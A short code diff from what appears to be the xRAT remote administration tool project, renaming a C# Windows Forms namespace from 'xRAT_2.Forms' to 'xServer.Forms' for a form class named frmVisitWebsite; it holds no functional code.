@@ -1,4 +1,4 @@
-﻿namespace xRAT_2.Forms
+﻿namespace xServer.Forms
 {
     partial class frmVisitWebsite
     {
